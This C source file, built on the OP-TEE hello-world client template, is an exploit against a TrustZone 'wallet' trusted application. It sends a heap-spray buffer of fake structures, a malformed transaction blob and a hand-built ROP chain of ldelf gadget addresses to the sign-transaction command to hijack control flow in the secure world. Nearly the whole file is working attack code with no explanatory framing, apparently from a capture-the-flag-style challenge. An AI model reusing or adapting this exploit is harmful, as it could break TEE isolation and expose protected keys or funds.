/*
 * Copyright (c) 2016, Linaro Limited
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice,
 * this list of conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 * this list of conditions and the following disclaimer in the documentation
 * and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 */

#include <err.h>
#include <stdio.h>
#include <string.h>

/* OP-TEE TEE client API (built by optee_client) */
#include <tee_client_api.h>

/* For the UUID (found in the TA's h-file(s)) */
#include <wallet_ta.h>

int get_wallet(TEEC_Session *sess, int index)
{
  TEEC_Operation op;
  TEEC_Result res;
  uint32_t err_origin;

  /* Get the address of wallet */
  memset(&op, 0, sizeof(op));

  op.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_INPUT,
                                   TEEC_MEMREF_TEMP_OUTPUT,
                                   TEEC_NONE,
                                   TEEC_NONE);


  op.params[0].value.a = index;

  char wallet0_address[128] = {};
  op.params[1].tmpref.buffer = &wallet0_address;
  op.params[1].tmpref.size = sizeof(wallet0_address);

  res = TEEC_InvokeCommand(sess, TA_WALLET_CMD_GET_ADDRESS_FOR_WALLET, &op,
                           &err_origin);
  if (res != TEEC_SUCCESS)
  {
    printf("Failed to get wallet\n");
    return -1;
  }

  printf("Address for wallet %d %s\n", op.params[0].value.a, op.params[1].tmpref.buffer);
  return 0;
}

int create_wallet(TEEC_Session *sess)
{
  TEEC_Operation op;
  TEEC_Result res;
  uint32_t err_origin;

  memset(&op, 0, sizeof(op));

  op.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_OUTPUT, TEEC_NONE,
                                   TEEC_NONE, TEEC_NONE);

  res = TEEC_InvokeCommand(sess, TA_WALLET_CMD_CREATE_WALLET, &op,
                           &err_origin);
  if (res != TEEC_SUCCESS)
  {
    printf("Failed to create wallet\n");
    return -1;
  }

  printf("TA gave wallet id %d\n", op.params[0].value.a);

  return op.params[0].value.a;
}

int main(int argc, char **argv)
{
	TEEC_Result res;
	TEEC_Context ctx;
	TEEC_Session sess;
	TEEC_Operation op;
	TEEC_UUID uuid = TA_WALLET_UUID;
	uint32_t err_origin;

        int i = 0;

	/* Initialize a context connecting us to the TEE */
	res = TEEC_InitializeContext(NULL, &ctx);
	if (res != TEEC_SUCCESS)
          errx(1, "TEEC_InitializeContext failed with code 0x%x", res); 

	/*
	 * Open a session to the "hello world" TA, the TA will print "hello
	 * world!" in the log when the session is created.
	 */
	res = TEEC_OpenSession(&ctx, &sess, &uuid,
			       TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
	if (res != TEEC_SUCCESS)
		errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x",
			res, err_origin);

	/*
	 * Execute a function in the TA by invoking it, in this case
	 * we're incrementing a number.
	 *
	 * The value of command ID part and how the parameters are
	 * interpreted is part of the interface provided by the TA.
	 */

        int wallet_id = 0;
        if (get_wallet(&sess, 0))
        {
          printf("Failed to get wallet_id %d\n", 0);
          wallet_id = create_wallet(&sess);
          printf("Created wallet with id %d\n", wallet_id);
        }

	memset(&op, 0, sizeof(op));


        op.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_INPUT,
                                         TEEC_VALUE_INPUT,
                                         TEEC_MEMREF_TEMP_INPUT,
                                         TEEC_MEMREF_TEMP_OUTPUT);

        op.params[0].value.a = 0;

        op.params[1].value.a = 0;

        char *fill_buf = malloc(0x5000);
        op.params[2].tmpref.buffer = fill_buf;
        memset(fill_buf, 0x41, 0x5000);
        memset(fill_buf, 0x42, 0x2400);
        uint32_t *fb = fill_buf + 0x2403;
        for (i = 0; i < 256; i+=4)
        {
          fb[i] =0x1;
          fb[i+1] = 0x00201000;
          fb[i+2] = 0x115ed8 - 8; // our out payload
          fb[i+3] = 0x1; // phdr pointer
        }
        op.params[2].tmpref.size = 0x5000;

        op.params[3].tmpref.buffer = malloc(256);
        op.params[3].tmpref.size = 256;

        res = TEEC_InvokeCommand(&sess, TA_WALLET_CMD_SIGN_TRANSACTION, &op, &err_origin);
        if (res != TEEC_SUCCESS)
        {
          printf("TEEC_InvokeCommand failed with code 0x%x origin 0x%x\n",
               res, err_origin);
        }
        free(fill_buf);
        
	/* Clear the TEEC_Operation struct */
	memset(&op, 0, sizeof(op));


        op.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_INPUT,
                                         TEEC_VALUE_INPUT,
                                         TEEC_MEMREF_TEMP_INPUT,
                                         TEEC_MEMREF_TEMP_OUTPUT);

        op.params[0].value.a = 0;

        op.params[1].value.a = 0;

        /* op.params[2].tmpref.buffer = \ */
        /*   "\x01\x00\x00\x00\x02" */
        /*   "\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44" */
        /*   "\x45\x45\x45\x45\x46\x46\x46\x46\x47\x47\x47\x47\x48\x48\x48\x48" */
        /*   "\x00\x00\x00\x00" */
        /*   "\x01\x41" */
        /*   "\xff\xff\xff\xff" */

        /*   "\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44" */
        /*   "\x45\x45\x45\x45\x46\x46\x46\x46\x47\x47\x47\x47\x48\x48\x48\x48" */
        /*   "\x01\x00\x00\x00" */
        /*   "\x01\x41" */
        /*   "\xff\xff\xff\xfe" */

        /*   "\x01" */
        /*   "\x90\x5f\x01\x00\x00\x00\x00\x00" */
        /*   "\x01\x43" */
        /*   "\x11\x11\x11\x11"; */

        /* op.params[2].tmpref.size = 47 * 3;         */
        char tx[] = "\x01\x00\x00\x00\x01"
          "\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44"
          "\x45\x45\x45\x45\x46\x46\x46\x46\x47\x47\x47\x47\x48\x48\x48\x48"
          "\x00\x00\x00\x00"
          "\x00"
          "\xff\xff\xff\xff"
          "\x01"
          "\x41\x41\x41\x41\x42\x42\x42\x42"
          "\xab"
          "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
          "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
          "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
          "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
          "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
          "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
          "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
          "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
          "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
          "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
          "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
          "\x00\x00\x33\x00";


        size_t payload_sz = sizeof(tx);
        
        char *exp_buf = malloc(payload_sz);
        memset(exp_buf, 0x41, payload_sz);
        memcpy(exp_buf, tx, sizeof(tx));

        /*
        op.params[2].tmpref.buffer = tx;

        op.params[2].tmpref.size = sizeof(tx);
        */

        op.params[2].tmpref.buffer = exp_buf;
        op.params[2].tmpref.size = payload_sz;

        uint32_t rop_buf[0x2000/4];
        memset(rop_buf, 0x41, sizeof(rop_buf));

        uint32_t ldelf_base = 0x00104000;

        // default value for test distro
        //i = 0x124;
        // i noticed 0x104 appears to be the production value, i dont know why
        i = 0x104;
        if (argc > 1)
        {
          i = atoi(argv[1]);
        }
        printf("starting chain at %d\n", i);
        
        rop_buf[i++] = 0x42424242;
        rop_buf[i++] = 0x43434343;
        rop_buf[i++] = 0x44444444;
        rop_buf[i++] = 0x45454545;
        // begin rop chain
        rop_buf[i++] = ldelf_base + 0x8b4f;
        rop_buf[i++] = ldelf_base + 0x8bdd; //0x47474747;
        rop_buf[i++] = 0x201018;

        rop_buf[i++] = ldelf_base + 0x8e6b; // new pc
        rop_buf[i++] = 0x201020;
        //rop_buf[i++] = 0x202000; // new r0
        //rop_buf[i++] = 0x201028; // new r7
        /*
    8c44:       697b            ldr     r3, [r7, #20]
    8c46:       4618            mov     r0, r3
    8c48:       f107 0718       add.w   r7, r7, #24
    8c4c:       46bd            mov     sp, r7
    8c4e:       bd80            pop     {r7, pc}

        */

        //rop_buf[i++] = ldelf_base + 0x8c45; // 
        rop_buf[i++] = ldelf_base + 0x8e69;
        rop_buf[i++] = 0x201028;
        rop_buf[i++] = ldelf_base + 0x8c45;
        rop_buf[i++] = 0x53535353;
        rop_buf[i++] = 0x54545454;
        rop_buf[i++] = 0x55555555;
        rop_buf[i++] = 0x201300;
        rop_buf[i++] = 71;
        rop_buf[i++] = ldelf_base + 0x84;
        rop_buf[i++] = 0x53535353;
        rop_buf[i++] = 0x54545454;

        op.params[3].tmpref.buffer = rop_buf;
        op.params[3].tmpref.size = sizeof(rop_buf);;

        res = TEEC_InvokeCommand(&sess, TA_WALLET_CMD_SIGN_TRANSACTION, &op, &err_origin);
        if (res != TEEC_SUCCESS) {
          //errx(1, "TEEC_InvokeCommand failed with code 0x%x origin 0x%x",
          //     res, err_origin);
        }

        for (i =0 ; i< op.params[3].tmpref.size/4; i++)
        {
          printf("%02x", ((char *)(op.params[3].tmpref.buffer))[i]);
          //printf("[%x]: %x\n", i, rop_buf[i]);
        }
        printf("\n");
	/*
	 * We're done with the TA, close the session and
	 * destroy the context.
	 *
	 * The TA will print "Goodbye!" in the log when the
	 * session is closed.
	 */

	TEEC_CloseSession(&sess);

	TEEC_FinalizeContext(&ctx);

	return 0;
}
